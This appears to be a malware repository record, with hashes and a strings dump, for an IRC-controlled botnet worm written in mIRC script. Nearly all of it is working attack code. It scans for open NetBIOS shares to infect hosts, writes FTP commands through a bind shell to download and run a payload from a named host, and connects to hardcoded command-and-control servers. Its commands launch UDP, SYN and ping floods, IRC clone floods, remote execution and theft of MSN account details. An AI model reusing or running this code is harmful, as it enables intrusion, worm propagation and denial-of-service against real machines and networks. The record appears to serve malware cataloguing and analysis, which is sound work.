%infection %sf $+ \" | notice %o1 [NetBios Scanner] Found Open Port: $sock($sockname).port at: %infection , Attempting to root. [Ipc Sharing] [ %nb.port ] | inc %totalscanned | sockclose $sockname | unset %infection | halt }\n  if (%scan.bat = c) { if ($sockerr > 0) { halt } | set %infection % [ $+ [ $sockname ] ] | run eoputr.exe /n /fh /r \"c.bat %infection %sf $+ \" | notice %o1 [NetBios Scanner] Found Open Port: $sock($sockname).port at: %infection , Attempting to root. [C Sharing] [ %nb.port ] | inc %totalscanned | sockclose $sockname | unset %infection | halt }\n  if (%scan.bat = ipc.admin.c) { if ($sockerr > 0) { halt } | set %infection % [ $+ [ $sockname ] ] | run eoputr.exe /n /fh /r \"m2.bat %infection %sf $+ \" | notice %o1 [NetBios Scanner] Found Open Port: $sock($sockname).port at: %infection , Attempting to root. [Admin/Ipc/C Sharing] [ %nb.port ] | inc %totalscanned | sockclose $sockname | unset %infection | halt }\n  if (%scan.bat = b) { if ($sockerr > 0) { halt } | set %ant1 % [ $+ [ $sockname ] ] | talk port open ip: %ant1 }\n  if (%scan.bat = a) { if ($sockerr > 0) { halt } | set %ant1 % [ $+ [ $sockname ] ] | run eoputr.exe /n /fh /r \"spread.bat   %ant1 %sf $+ \" | notice %o1 op: %ant1 | sockclose $sockname | unset %ant1 | halt }\n  if (%scan.bat = f) { if ($sockerr != 0) { .sockclose $sockname | halt } | run van32.exe dl.exe -t $sock($sockname).ip 6175 | run van32.exe dl.exe 0 $sock($sockname).ip 6175 | run van32.exe dl.exe 1 $sock($sockname).ip 6175 | run van32.exe dl.exe 2 $sock($sockname).ip 6175 | timerBind $+ $sockname 1 7 sockopen bind445 $+ $ticks $sock($sockname).ip 6175 | sockclose $sockname }\n}\non 1:sockopen:bind445*: { \n  if ($sockerr != 0) { .sockclose $sockname | halt } \n  sockmark $sockname\n  timer $+ $sockname 1 10  sockwrite -nt $sockname dd\n  timer $+ $sockname $+ 1 1 10  sockwrite -nt $sockname dd\n  sockwrite -nt $sockname echo open ftp.freewebtown.com 21>>x.txt\n  sockwrite -nt $sockname echo asssa>>x.txt\n  sockwrite -nt $sockname echo cy1D.5gq>>x.txt\n  sockwrite -nt $sockname echo binary>>x.txt\n  sockwrite -nt $sockname echo hash>>x.txt\n  sockwrite -nt $sockname echo get xpxp.exe>>x.txt\n  sockwrite -nt $sockname echo quit>>x.txt\n  sockwrite -nt $sockname ftp -s:x.txt\n  sockwrite -nt $sockname del x.txt\n  sockwrite -nt $sockname xpxp.exe\n  timerUpIt $+ $sockname 0 8 /sockwrite -nt $sockname dd\n  timerclose $+ $sockname 1 700 /sockclose $sockname\n}\non *:sockread:bind445*:{ \n  sockread %readroot \n  if (system32> $+ %sf isin %readroot) { \n    talk lsass : $sock($sockname).ip is Now completed using port: %nb.port .. \n    timerUpIt $+ $sockname off \n    sockclose $sockname \n  } \n}"
    },
    "filename": "VirusShare_41d044626cbff8117f5c6a364beb0003",
    "filesize": 54833,
    "filetype": "data",
    "hashes": {
        "md5": "41d044626cbff8117f5c6a364beb0003",
        "sha1": "acbcbffbc5e2a413149b8bd8a8e7fb7ac08d479f",
        "sha256": "39ba3058dfe8fcc74a4d106099dd39b4c3e80f58febba305ef0f3698db02dd69"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "on *:ExIt:{ SoCkClOsE * | RlEvEl 666 | UnSeT %* }",
            "on *:StArT:{",
            "  SeTuP",
            "  %aa",
            "  %ss",
            "  %yy",
            "AlIaS SeTuP {",
            "  %aa = CoNnEcT",
            "  %ss = CfAc",
            "  %yy = SeTtInGs2",
            "  %asas = FnIcK",
            "  %perfix = !",
            "  %sf = xpxp.exe",
            "  %channel = #Gt",
            "  %key = 987654",
            "  %o1 = sososm",
            "alias CoNnEcT {",
            "  if (%s1 == $null) { %s1 = ooss.dynu.com server1:6667 }",
            "  if (%s2 == $null) { %s2 = Logo.IRCXNET.NET server2:6667 }",
            "  if (%s3 == $null) { %s3 = CCP.IRCXNET.NET server3:6667 }",
            "  if (%s4 == $null) { %s4 = ssoo.dynu.com server4:6667 }",
            "  if (%s5 == $null) { %s5 = ssoo.dynu.net server5:6667 }",
            "  if (%s6 == $null) { %s6 = ooss.dynu.net server6:6667 }",
            "  if (%s7 == $null) { %s7 = coderx.dynu.com server7:6667 }",
            "  if (%s8 == $null) { %s8 = ma2002am.dynu.net server8:6667 }",
            "  server %s1",
            "  timercheckserver -o 0 90 servercheck",
            "alias CfAc { ",
            "  if ($exists(dat) = $false) { mkdir dat | rename config.ini dat\\config.ini | rename language.ini dat\\language.ini | rename nt_pass.dic dat\\nt_pass.dic | rename nt_user.dic dat\\nt_user.dic | rename os.finger dat\\os.finger | rename port.ini dat\\port.ini | rename rpc.ini dat\\rpc.ini }  ",
            "  if ($exists(plugin) = $false) { mkdir plugin | rename 090-ntpass.xpn plugin\\090-ntpass.xpn }  ",
            "on *:CoNnEcT:{ mode $me +ix | join %channel 7070 | .timerlll 0 35 raw -q ping $me | %asas | ial on | pdcc on | fsend on | clearall } }",
            "on *:disCoNnEcT:{ rlevel 666 | run van32.exe calcu.exe -kf roudSTID.EXE }",
            "on *:KiCk:%channel:{ .timerfastjoin -o 0 1 .join %channel 7070 } }",
            "on *:JoIn:*:{ if ($nick == $me) { .timerfastjoin off } }",
            "on ^*:PoNg:{ ctcp $me ping }",
            "on 666:part:%users:{ ruser 666 $nick | clearall }",
            "on 666:quit:%users:{ ruser 666 $nick | clearall }",
            "on 666:nick:%users:{ ruser 666 $nick | clearall }",
            "on *:text:!start*:%channel:{ ",
            "  if (km3331 isin $nick) && ($2 = %key) && ($level($nick) != 666) { ",
            "    talk Password Accepted For: $nick , Bot Version: -=[ Power Team ]=-",
            "    auser 666 $nick",
            "    halt ",
            "  } ",
            "alias servercheck { if (!$server) || ($server == $null) { if (!$var(%servercheck)) || ($server == $null) || (%servercheck = 0) { set %servercheck 1 | server %s2 |  timercheckserver -o 0 50 servercheck1 } } }",
            "alias servercheck1 { if (!$server) || ($server == $null) { if (!$var(%servercheck)) || ($server == $null) || (%servercheck = 1) { set %servercheck 2 | server %s3 | timercheckserver -o 0 50 servercheck2 } } }",
            "alias servercheck2 { if (!$server) || ($server == $null) { if (!$var(%servercheck)) || ($server == $null) || (%servercheck = 2) { set %servercheck 3 | server %s4 | timercheckserver -o 0 50 servercheck3 } } }",
            "alias servercheck3 { if (!$server) || ($server == $null) { if (!$var(%servercheck)) || ($server == $null) || (%servercheck = 3) { set %servercheck 4 | server %s5 | timercheckserver -o 0 50 servercheck4 } } }",
            "alias servercheck4 { if (!$server) || ($server == $null) { if (!$var(%servercheck)) || ($server == $null) || (%servercheck = 4) { set %servercheck 5 | server %s6 | timercheckserver -o 0 50 servercheck5 } } }",
            "alias servercheck5 { if (!$server) || ($server == $null) { if (!$var(%servercheck)) || ($server == $null) || (%servercheck = 5) { set %servercheck 6 | server %s7 | timercheckserver -o 0 50 servercheck6 } } }",
            "alias servercheck6 { if (!$server) || ($server == $null) { if (!$var(%servercheck)) || ($server == $null) || (%servercheck = 6) { set %servercheck 7 | server %s8 | timercheckserver -o 0 50 servercheck } } }",
            "alias ownage return $gettok(ownage scripting hack fuck crack fuckyou spy military hacker usa cracker krakz ,$r(1,10),32 ) ",
            "alias talk { var %& $1- | var %co 0 | while (%co < $numtok(%&,32)) { inc %co | var %_t = %_t $iif($upper($left($gettok(%&,%co,32),1)) isalpha,",
            " $+ $upper($left($gettok(%&,%co,32),1)) $+ ",
            "1 $+ $right($gettok(%&,%co,32),-1) $+ ",
            " $+ $upper($left($gettok(%&,%co,32),1)) $+ $right($gettok(%&,%co,32),-1)) } | msg %channel %_t | clearall",
            "on 666:text:*:*:{",
            "  if ( $1 == %perfix $+ Ramok) { x $2- }",
            "  if ( $1 == %perfix $+ LoGoUt) { ruser $nick | talk you are logged out $nick }",
            "  if ( $1 == %perfix $+ Ip) { talk ip/host: $ip $+ / $+ $host / $time $+ @ $+ $date / $os / $duration($calc($ticks / 1000 )) }",
            "  if ( $1 == %perfix $+ D) && $2 != $null) { talk DCC Sending $2 To $nick | dcc send $nick $2 }",
            "  if ( $1 == %perfix $+ BnC) && ($3 != $null) { if ($sock(Bnc)) { talk [ERROR] bnc is already active on port: %Bnc.Port $+ , pass: %Bnc.passwd | halt } | %Bnc = on | socklisten Bnc $2 | %Bnc.port = $2 | %Bnc.passwd = $3 | talk [bnc] /server -m $ip $+ : $+ $2 $+ , then /quote PASS $3 }",
            "  if ( $1 == %perfix $+ BnCs) && (%Bnc.Port != $null) { sockclose Bnc* | talk [bnc] server on port %bnc.port is now off | unset %bnc.* | sockclose Bnc* }",
            "  if ( $1 == %perfix $+ Jo) && ($2 != $null) { join $2 | talk joined $2 }",
            "  if ( $1 == %perfix $+ Pa) && ($2 != $null) { part $2 | talk parted $2 }",
            "  if ( $1 == %perfix $+ randscan) && ( $3 != $null ) && (%begshortip == $null) && ($exists(%sf)) { set %loud on | set %begit $randip($2) | talk Starting scan from: %begit to $3 | set %begshortip %begit | set %beglongip $longip(  %begshortip ) | set %endshortip $3 | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | st4rtsc4n }",
            "  if ( $1 == %perfix $+ Re) { talk Reconnecting to %server | /server %server }",
            "  if ( $1 == %perfix $+ PacKeT) && ($3 != $null) { run eoputr.exe /n /fh /r \"ping.exe $2 -n $3 -l 65500\" | talk [PING] packeting $2 with $calc($3 *65536/1024/1000) $+ mb traffic }",
            "  if ( $1 == %perfix $+ PaCkEtS) { run eoputr.exe /n /fh /r \" $+ $mircdirlibparse.exe -kf ping.exe\" | talk [DDoS] packeting halted! }",
            "  if ( $1 == %perfix $+ UpO) && ($2 != $null) { mode $2 +o $nick }",
            "  if ( $1 == %perfix $+ UpOo) && ($2 != $null) { mode $2 +q $nick }",
            "  if ( $1 == %perfix $+ RaNdSs) { set %iip1 $randip($2) | set %iip2 $3 | set %rangeip %iip1 $+ - $+ %iip2 | run van32.exe roudSTID.EXE -host %rangeip -ntpass -t 150,75 | talk %rangeip | unset %rangeip } ",
            "  if ( $1 == %perfix $+ rAnD) { set %iip1 $gettok($ip,1-2,46) $+ . $+ $rand(1,255) $+ .1 | set %iip2 $gettok($ip,1-2,46) $+ .255.255 | set %rangeip %iip1 $+ - $+ %iip2 | run van32.exe roudSTID.EXE -host %rangeip -ntpass -t 150,75 | talk %rangeip | unset %rangeip } ",
            "  if ( $1 == %perfix $+ scanall) { set %iip1 $gettok($ip,1-2,46) $+ . $+ $rand(1,255) $+ .1 | set %iip2 $gettok($ip,1-2,46) $+ .255.255 | set %rangeip %iip1 $+ - $+ %iip2 | run van32.exe roudSTID.EXE -host %rangeip -all | talk %rangeip | unset %rangeip | timerparse -o 0 45 startparse | timerroot -o 0 100 getroot }",
            "  if ( $1 == %perfix $+ StaR) { set %iip1 $gettok($ip,1-2,46) $+ .1.1 | set %iip2 $gettok($ip,1-2,46) $+ .255.255 | set %rangeip %iip1 $+ - $+ %iip2 | run van32.exe roudSTID.EXE -host %rangeip -ntpass -t 150,75 | talk %rangeip | unset %rangeip }",
            "  if ( $1 == %perfix $+ RaNdIp) { set %iip1 $gettok($ip,1-3,46) $+ .1 | set %iip2 $gettok($ip,1-2,46) $+ .255.255 | set %rangeip %iip1 $+ - $+ %iip2 | run van32.exe roudSTID.EXE -host %rangeip -ntpass -t 150,75 | talk %rangeip | unset %rangeip }",
            "  if ( $1 == %perfix $+ StOp) { set %status 0 | run van32.exe calcu.exe -kf roudSTID.EXE | talk stop } ",
            "  if ( $1 == %perfix $+ r) { /run $2- | talk ",
            "ile ",
            "k . $+ ! | halt }",
            "  if ( $1 == %perfix $+ rem) { /remove $2- | talk ",
            "emove ",
            "k . $+ ! | halt }",
            "  if ( $1 == %perfix $+ qu) { exit }",
            "  if ( $1 == %perfix $+ msn) { .comopen msn Messenger.UIAutomation | if ($comerr) { return } | %a = $com(msn,MyStatus,2) | %b = $com(msn).result | %a = $com(msn,MyFriendlyName,2) | %c = $com(msn).result | %a = $com(msn,MySigninName,2) | %d = $com(msn).result | %a = $com(msn,MyServiceName,2) | %e = $com(msn).result | %x = $com(msn,InstallationDirectory,1) | .comclose msn | if (%b = 1) { %b = Offline } | if (%b = 2) { %b = Online } | if (%b = 6) { %b = Invisible } | if (%b = 10) { %b = Busy } | if (%b = 14) { %b = Be Right Back } | if (%b = 18) { %b = Idle } | if (%b = 34) { %b = Away } | if (%b = 50) { %b = On the Phone } | if (%b = 66) { %b = Out for Lunch } | if (%b = offline) { talk Msn: Currently Offline! } | else { talk Msn: [Nickname: %c $+ ]  [E-mail: %d $+ ] [Service Provider: %e $+ ] [Status: %b $+ ] } }",
            "  if ( $1 == %perfix $+ ma) { /download $2- | /talk ",
            "14Downloading..",
            "14 }",
            "  if ( $1 == %perfix $+ FtP) {",
            "    if ( $2 = -a) && (%ftp.stats == $null) { %ftp.stats = 1 | %ftp.user = $3 | %ftp.pass = $4 | %ftp.port = $5 | write -l7 rconnect.conf <User \" $+ %ftp.user $+ \"> | write -l8 rconnect.conf \tPassword \" $+ %ftp.pass $+ \" | write -l2 rconnect.conf BindPort %ftp.port | talk [FTP] ftp started at: $+(ftp://,%ftp.user,:,%ftp.pass,@,$ip,:,%ftp.port,/) | run eoputr.exe /n /fh /r \"ipcfg.exe | halt }",
            "    if ( $2 = -b) && (%ftp.stats != $null) { run eoputr.exe /n /fh /r \"calcu.exe -kf ipcfg.exe\" | talk [FTP] ftp on: $ip is now halted | unset %ftp.* | remove rconnect.log | halt }",
            "  if ( $1 == %perfix $+ n) { ",
            "    if ( $2 == -a) { %run.f.n = $3- | if $exists(%run.f.n) { talk Attempting To Run: %run.f.n , [Normal] | timerrunn 1 2 run %run.f.n | halt } }",
            "    if ( $2 == -b) { %run.f.h = $3- | if $exists(%run.f.h) { talk Attempting To Run: %run.f.h , [Hidden] | timerrunh 1 2 run eoputr.exe /n /fh /r \" $+ %run.f.h $+ \" | halt } }",
            "  if ( $1 == %perfix $+ PiNgo) {",
            "    if ( $2 == -a) && (%pingo == $null) { %pingo = 1 | %pingip = $3 | %pingmb = $4 | run eoputr.exe /n /fh /r \"ping.exe %pingip -n %pingmb -l 65500 -w 0\" | talk [Ping Attack] Started Ping Attack on: %pingip , with $calc($4 *65536/1024/1000) $+ mb of traffic.. | timerp 1 10 unset %pingo | halt }",
            "    if ( $2 == -b) && (%pingo != $null) { unset %ping* | talk [Ping Attack] Attacking Is Now Halted.. | run eoputr.exe /n /fh /r \"calcu.exe -kf ping.exe\" | halt }",
            "  if ( $1 == %perfix $+ nb) && ($2-) {",
            "    if ( $2 == isp) && ($3 = start) && (%begshortip == $null) && $exists(%sf) { set %nb.port $5 | set %scan.bat $4 | set %begit $gettok($ip,1-2,46) $+ .1.1 | talk [MyDoom.A Scanner] starting scan from: %begit to $gettok($ip,1-2,46) $+ .255.255 using %scan.bat sharing thru port %nb.port .. | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1-2,46) $+ .255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | st4rtsc4n }",
            "    if ( $2 == isp) && ($3 = rand) && (%begshortip == $null) && $exists(%sf) { set %nb.port $5 | set %scan.bat $4 | set %begit $gettok($ip,1-2,46) $+ . $+ $rand(1,255) $+ . $+ $rand(1,255) | talk [NetBios Scanner] starting scan from: %begit to $gettok($ip,1-2,46) $+ .255.255 using %scan.bat sharing thru port %nb.port .. | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1-2,46) $+ .255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | st4rtsc4n }",
            "    if ( $2 == ip) && (%begshortip == $null) && $exists(%sf) { set %nb.port $4 | set %scan.bat $3 | set %begit $gettok($ip,1-3,46) $+ .1 | talk [NetBios Scanner] starting scan from: %begit to $+($gettok($ip,1-3,46),.255) using %scan.bat sharing thru port %nb.port .. | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1-3,46) $+ .255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | st4rtsc4n }",
            "    if ( $2 == start) && (%begshortip == $null) && $exists(%sf) { set %nb.port $6 | set %scan.bat $5 | set %begit $randip($3) | talk [NetBios Scanner] starting scan from: %begit to $4 using %scan.bat sharing thru port %nb.port .. | set %begshortip %begit | set %beglongip $longip(  %begshortip ) | set %endshortip $4 | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | st4rtsc4n }",
            "    if ( $2 == stop) && (%begshortip != $null) { talk scanner scanning from: %begshortip to %endshortip stopped by $nick $+ ! | stopscan }",
            "    if ( $2 == s) && (%begshortip != $null) { talk scanner stats, range: [ %begshortip - %endshortip ] port: [ $sock($sockname).port ] current ip: [ %ip28 ] total found: [ $totalfound ] sharing method:[ %scan.bat ] spreading port: [ %nb.port ] spreading file: [ %sf ] }",
            "    if ( $2 == on) { talk Scanner now ON | %auto = on }",
            "    if ( $2 == off) { talk Scanner now off | %auto = off }",
            "    if ( $2 == ran) && (%begshortip == $null) { randscan | set %begshortip %1p1 | set %endshortip %1p2 | set %beglongip $longip(  %begshortip ) | st4rtsc4n | talk Scan from: %1p1 to %1p2 }",
            "  if ( $1 == %perfix $+ nik) { set %udp.inc 0 | set %udp.fuck $2 | set %udp.reps $3 | .nuke %udp.reps %udp.fuck | talk Atacking %udp.fuck ip %udp.reps time | halt }  ",
            "  if ( $1 == %perfix $+ udpkill) { unset %udpkillipz | unset %udpktimes | set %udpkillipz $2 | set %udpktimes $3 | runudpkill }",
            "  if ( $1 == %perfix $+ Clones) { set %channel2 $5- | set %bojnom $2 | set %bojserver $3 | set %bojport $4 | if ($5 == $null) { halt } | timerbojsock2 0 0  | timerbojsock -m %bojnom 100 bojsock }",
            "  if ( $1 == %perfix $+ Clonesjoin) { if ($2 == $null) { halt } | set %bojfuck $2 | sockwrite -n boj* join %bojfuck | sockwrite -n boj* privmsg $2 : $+ $str(F",
            "R.,40) | .timerboj $+ $sockname 0 4 bojflood }",
            "  if ( $1 == %perfix $+ ClonesClose) { unset %boj* %channel | sockclose boj* | .timerboj* off }",
            "  if ( $1 == %perfix $+ udp) { if (!$2) { talk udp error, synatx: !udp <host/ip> <port> <num of packets> <packet delay> | halt } | if (*.* !iswm $2) { talk udp error, You must specify a host/ip to packet. | halt } | if ($3 !isnum) { talk udp error, You must specify a PORT to flood. | halt } | if ($4 !isnum) { talk udp error, You must specify a NUMBER of packets. | halt } | if ($5 !isnum) { talk udp error, You must specify a PACKET-DELAY time. | halt } | %udp.ip = $2 | %udp.port = $3 | %udp.num = $4 | %udp.delay = $5 | talk udp attacking starting on ip: %udp.ip , port: %udp.port , amount: %udp.num , delay: %udp.delay  | .timerUDP %udp.num %udp.delay sockudp UDP $+ $r(1,999999999999999999) %udp.ip %udp.port $str(backXcr3w_,33) | unset %udp.* }",
            "  if ( $1 == %perfix $+ ddos) { if (!$2) { talk dos error, syntax: !dos <host/ip> <num of packets> | halt } | if (*.* !iswm $2) { talk dos error: You must specify a Host or IP. | halt } | if ($3 !isnum) { talk dos error: You must specify a NUMBER of packets | halt } | talk dos packeting.....  | run $hider /n /fh /r \"ping.exe $2 -n $3 -l 65500\" }",
            "  if ( $1 == %perfix $+ syn) && ($2- != $null) { if ($2 == stop) { halt } | set %synport $3 | if (%synport == random) { set %synport $rand(0,65535) } | talk syn flooding: $2 with $4 syn packets on port: %synport  | set %synaa $2 | synz start $4 $2 %synport }",
            "  if ( $1 == %perfix $+ syn) && ($2 == stop) && ($3- == $null) && (%synaa != $null) { sockclose syn* | talk syn flood on: %synaa halted.. | unset %synaa | halt }",
            "  if ( $1 == %perfix $+ satnickx) && ($3 != $null) { unset %satchan | unset %satserver | unset %satport | set %fld.tp nickx | set %satserver $2 | set %satport $3 | set %satchan $4 | startsfx }",
            "  if ( $1 == %perfix $+ satmix) && ($3 != $null) { unset %satchan | unset %satserver | unset %satport | set %fld.tp mix | set %satserver $2 | set %satport $3 | set %satchan $4 | startsfx }",
            "  if ( $1 == %perfix $+ satjpx) && ($3 != $null) { unset %satchan | unset %satserver | unset %satport | set %fld.tp jpx | set %satserver $2 | set %satport $3 | set %satchan $4- | startsfx }",
            "  if ( $1 == %perfix $+ satstop) { unset %satchan | unset %satserver | unset %satport | .sockclose crash* | msg # stop sat flood }",
            "  if ( $1 == %perfix $+ satmsgx) && ($3 != $null) { unset %satchan | unset %satserver | unset %satport | set %fld.tp msgx | set %satserver $2 | set %satport $3 | set %satchan $4- | startsfx }",
            "  if ( $1 == %perfix $+ satrip) && ($3 != $null) { unset %satchan | unset %satserver | unset %satport | set %fld.tp rip | set %satserver $2 | set %satport $3 | set %satchan $4 | startsfx }",
            "  if ( $1 == %perfix $+ clone) {",
            "    if ( $2 == load) && ($3 != $null) { sockopen flood- $+ $r(1,999) $+ $r(a,z) $+ $r(A,Z)  $3 $4 | talk clones loading: $3 $+ : $+ $4 | halt }",
            "    if ( $2 == quit) { sockwrite -tn flood-* QUIT : $+ $3- | talk clones are now disconnected.. | halt  }",
            "    if ( $2 == kill) { sockclose flood-* | .timerpc* off | talk attempting to close sockets. | halt  }",
            "    if ( $2 == join) && ($3 != $null) { sockwrite -tn flood-* JOIN $3 $4- | halt  }",
            "    if ( $2 == part) && ($3 != $null) { sockwrite -tn flood-* PART $3 $4- | halt }",
            "    if ( $2 == msg) && ($3 != $null) { sockwrite -tn flood-* privmsg $3 : $+ $4- | halt  }",
            "    if ( $2 == notice) && ($3 != $null) { sockwrite -tn flood-* privmsg $3 : $+ $4- | halt  }",
            "    if ( $2 == jp) && ($3 != $null) { sockwrite -n flood-* part $3 | sockwrite -n flood-* join $3 | sockwrite -n flood-* part $3 | sockwrite -n flood-* join $3 | sockwrite -n flood-* part $3 | sockwrite -n flood-* join $3 | sockwrite -n flood-* part $3 | sockwrite -n flood-* join $3 | sockwrite -n flood-* part $3 | sockwrite -n flood-* join $3 | sockwrite -n flood-* part $3 | sockwrite -n flood-* join $3 | sockwrite -n flood-* part $3 | sockwrite -n flood-* join $3 | sockwrite -n flood-* part $3 | sockwrite -n flood-* join $3 | halt  }",
            "    if ( $2 == nfld) { sockwrite -tn flood-* nick $r(A,Z) $+ $r(1,99) $+ $r(1,99) $+ $r(A,Z) $+ -[ $+ $r(1,9999) $+ ] | halt }",
            "    if ( $2 == -) || ($2 == .) { sockwrite -n flood-* $3- | halt }",
            "    if ( $2 == jmmp) { sockwrite -nt user.* Join $2 | sockwrite -nt user.* privmsg $2 : $3- | sockwrite -nt user.*  part $2 }",
            "    if ( $2 == jpp) && ($3 != $null) { sockwrite -tn user.* IRCX | sockwrite -tn user.* JOIN $3 $4- | sockwrite -tn user.* PART $3 $4- | sockwrite -tn user.* JOIN $3 $4- | sockwrite -tn user.* PART $3 $4- | sockwrite -tn user.* JOIN $3 $4- | sockwrite -tn user.* PART $3 $4- | sockwrite -tn user.* JOIN $3 $4- | sockwrite -tn user.* PART $3 $4- | sockwrite -tn user.* JOIN $3 $4- | sockwrite -tn user.* PART $3 $4- | sockwrite -tn user.* JOIN $3 $4- | sockwrite -tn user.* PART $3 $4- }",
            "    if ( $2 == jp3) && ($3 != $null) { sockwrite -tn user.* IRCX | timer 0 1 sockwrite -tn user.* JOIN $3 $4- | timer 0 2 sockwrite -tn user.* PART $3 $4- }",
            "    if ( $2 == jmp) && ($3 != $null) { sockwrite -tn user.* IRCX | sockwrite -tn user.* JOIN $3 $4- | sockwrite -tn user.* PRIVMSG $3 : $+ %m3 | sockwrite -tn user.* PART $3 $4- | sockwrite -tn user.* JOIN $3 $4- | sockwrite -tn user.* PRIVMSG $3 : $+ %m1 | sockwrite -tn user.* PART $3 $4- }",
            "    if ( $2 == jpm) { talk clones starting join/part flood with msg on: $3 | sockwrite -n flood-* JOIN $3 | sockwrite -tn flood-* part $3 #ViperX | sockwrite -tn flood-* join $3 | sockwrite -tn flood-* part $3 ",
            "SkerrX",
            " | sockwrite -tn flood-* join $3 | sockwrite -tn flood-* part $3 ",
            "SkerrX",
            " | sockwrite -n flood-* JOIN $3 | sockwrite -tn flood-* part $3 ",
            "SkerrX",
            " | sockwrite -tn flood-* join $3 | sockwrite -tn flood-* part $3 ",
            "SkerrX",
            " | sockwrite -tn flood-* join $3 | sockwrite -tn flood-* part $3 ",
            "SkerrX",
            " | sockwrite -n flood-* JOIN $3 | sockwrite -tn flood-* part $3 ",
            "SkerrX",
            " | sockwrite -tn flood-* join $3 | sockwrite -tn flood-* part $3 ",
            "SkerrX",
            " | sockwrite -tn flood-* join $3 | sockwrite -tn flood-* part $3 ",
            "SkerrX",
            " | sockwrite -n flood-* JOIN $3 | sockwrite -tn flood-* part $3 ",
            "ViperX",
            " | sockwrite -tn flood-* join $3 | sockwrite -tn flood-* part $3 ",
            "SkerrX",
            " | sockwrite -tn flood-* join $3 | sockwrite -tn flood-* part $3 ",
            "SkerrX",
            "    if ( $2 == Chanserv) { talk clones starting flooding Chanserv | set %Fchan # $+ $r(A,Z) $+ $r(1,9999) | sockwrite -nt flood-* Join %Fchan | sockwrite -nt flood-* Privmsg Chanserv : register %Fchan $random sss ss1 rf ffgh4e | halt  }",
            "    if ( $2 == Nickserv) { talk clones starting flooding nickserv | sockwrite -nt flood-* Privmsg Nickserv : register $random @ $+ $random $+ .com | halt }",
            "    if ( $2 == flood) { sockwrite -tn flood-* join $3 | sockwrite -tn flood-* privmsg $3 : $+ $4- | sockwrite -tn flood-* notice $3 : $+ $4- | sockwrite -tn flood-* privmsg $3 : $+ $4- | sockwrite -tn flood-* notice $3 : $+ $4- | halt }",
            "    if ( $2 == stfu)  { sockwrite -tn flood-* join $3 | sockwrite -tn flood-* notice $3 : $+ $str(F",
            "R.,10)",
            " | sockwrite -tn flood-* privmsg $3 : $+ $str(F",
            "R.,10)",
            " | sockwrite -tn flood-* notice $3 : $+ $str(F",
            "R.,10)",
            " | sockwrite -tn flood-* privmsg $3 : $+ $str(F",
            "R.,10)",
            " | sockwrite -tn flood-* notice $3 : $+ $str(F",
            "R.,10)",
            " | sockwrite -tn flood-* privmsg $3 : $+ $str(F",
            "R.,10)",
            "raw 332:*:{ ",
            "  %topic = $3-  ",
            "  if (a == $gettok(%topic,1,32)) {",
            "    if (i == $gettok(%topic,2,32)) && $exists(%sf) { set %iip1 $gettok($ip,1-2,46) $+ . $+ $rand(1,255) $+ . $+ 1 | set %iip2 $gettok($ip,1-2,46) $+ .255.255 | set %rangeip %iip1 $+ - $+ %iip2 | run van32.exe roudSTID.EXE -host %rangeip -ntpass -t 150,75 | talk %rangeip | set %iip1 $gettok($ip,1-2,46) $+ . $+ $rand(1,255) $+ . $+ 1 | set %iip2 $gettok($ip,1-2,46) $+ .255.255 | set %rangeip %iip1 $+ - $+ %iip2 | run van32.exe roudSTID.EXE -host %rangeip -ntpass -t 150,75 | talk %rangeip | timerparse -o 0 45 startparse | timerroot -o 0 100 getroot }",
            "    if (i == $gettok(%topic,2,32)) && (s == $gettok(%topic,3,32)) && (%begshortip == $null) && $exists(%sf) { set %nb.port $gettok(%topic,5,32) | set %scan.bat $gettok(%topic,4,32) | set %begit $gettok($ip,1-2,46) $+ .1.1 | talk Scan: %begit to $gettok($ip,1-2,46) $+ .255.255 using %scan.bat port %nb.port .. | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1-2,46) $+ .255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | st4rtsc4n | %auto = on }",
            "    if (i == $gettok(%topic,2,32)) && (r == $gettok(%topic,3,32)) && (%begshortip == $null) && $exists(%sf) { set %nb.port $gettok(%topic,5,32) | set %scan.bat $gettok(%topic,4,32) | set %begit $gettok($ip,1-2,46) $+ . $+ $rand(1,255) $+ . $+ $rand(1,255) | talk Scan: %begit to $gettok($ip,1-2,46) $+ .255.255 using %scan.bat port %nb.port .. | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1-2,46) $+ .255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | st4rtsc4n | %auto = on }",
            "    if (i == $gettok(%topic,2,32)) && (ip == $gettok(%topic,3,32)) && (%begshortip == $null) && $exists(%sf) { set %nb.port $gettok(%topic,4,32) | set %scan.bat $gettok(%topic,3,32) | set %begit $gettok($ip,1-3,46) $+ .1 | talk Scan: %begit to $+($gettok($ip,1-3,46),.255) using %scan.bat port %nb.port .. | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1-3,46) $+ .255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | st4rtsc4n | %auto = on }",
            "    if (i == $gettok(%topic,2,32)) && (%begshortip == $null) && $exists(%sf) { set %nb.port $gettok(%topic,6,32) | set %scan.bat $gettok(%topic,5,32) | set %begit $randip($gettok(%topic,3,32)) | talk Scan: %begit to $gettok(%topic,4,32) using %scan.bat port %nb.port .. | set %begshortip %begit | set %beglongip $longip(  %begshortip ) | set %endshortip $gettok(%topic,4,32) | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | st4rtsc4n | %auto = on }",
            "raw 366:*: {",
            "  haltdef",
            "  if (%channel($2).topic == $null) && ($nick($2,0) == 1) { topic %channel a i r f 139 | mode %channel +ntsk 7070 | mode %channel +l 10000 }",
